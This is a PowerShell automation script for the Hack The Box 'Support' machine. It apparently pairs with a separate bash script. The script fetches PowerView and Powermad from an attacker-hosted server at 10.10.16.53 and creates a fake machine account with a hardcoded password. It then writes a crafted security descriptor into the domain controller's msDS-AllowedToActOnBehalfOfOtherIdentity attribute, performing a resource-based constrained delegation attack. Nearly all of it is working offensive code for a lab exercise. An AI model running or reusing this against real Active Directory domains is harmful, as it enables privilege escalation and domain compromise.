Write-Host "Welcom To Bl1ck Automation For Support.htb Machine"
Write-Host "Please Download The Bash File To Download The Library File And Start Http Server"
Write-Host "Please Read The Script And Change The Ip"

Invoke-WebRequest -Uri "http://10.10.16.53/powerview.ps1" -OutFile "powerview.ps1"
Invoke-WebRequest -Uri "http://10.10.16.53/powermad.ps1" -OutFile "powermad.ps1" 

Import-Module .\powermad.ps1
Import-Module .\powerview.ps1

Get-DomainObject -Identity "dc=support,dc=htb" -Domain support.htb
Get-NetComputer dc | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'bl1ckhere' -AsPlainText -Force) -Verbose
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5601)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer dc| Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
Get-DomainComputer dc -Properties 'msds-allowedtoactonbehalfofotheridentity'


Write-Host "Now All The Command Is Finished Please Go In The Bash Script And Type finished"
